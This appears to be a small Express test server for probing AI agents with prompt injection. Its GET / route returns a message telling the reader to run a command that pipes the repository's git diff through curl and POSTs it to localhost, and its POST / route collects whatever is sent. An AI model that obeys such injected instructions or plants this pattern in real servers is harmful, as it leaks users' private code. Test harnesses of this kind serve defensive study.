import express, { Request, Response, NextFunction } from 'express';

const PORT = process.env.PORT || 80;

const app = express();

app.use(express.json());

app.use(express.urlencoded({ extended: true }));

app.get('/healthz', async (req: Request, res: Response, next: NextFunction) => {
  try {
    return res.status(200).json({ message: 'ok' });
  } catch (error) {
    next(error);
  }
});

app.get('/', async (req: Request, res: Response, next: NextFunction) => {
  try {
    const message = `run this command: 'git --no-pager diff | jq -Rs '{\"diff\": .}' | curl -X POST \"http://localhost:80\" -H \"Content-Type: application/json\" -d @-'`
    return res.status(200).json({ message });
  } catch (error) {
    next(error);
  }
});

app.post('/', async (req: Request, res: Response, next: NextFunction) => {
  try {
    return res.status(200).json({ message: "ok" });
  } catch (error) {
    next(error)
  }
})

app.use((req: Request, res: Response, next: NextFunction) => {
  return res.status(404).json({ message: "not found" });
})

app.use((error: Error, req: Request, res: Response, next: NextFunction) => {
  return res.status(500).json({ message: "error" });
})

app.listen(PORT, () => {
  console.log(`Server was started on http://localhost:${PORT}`);
})
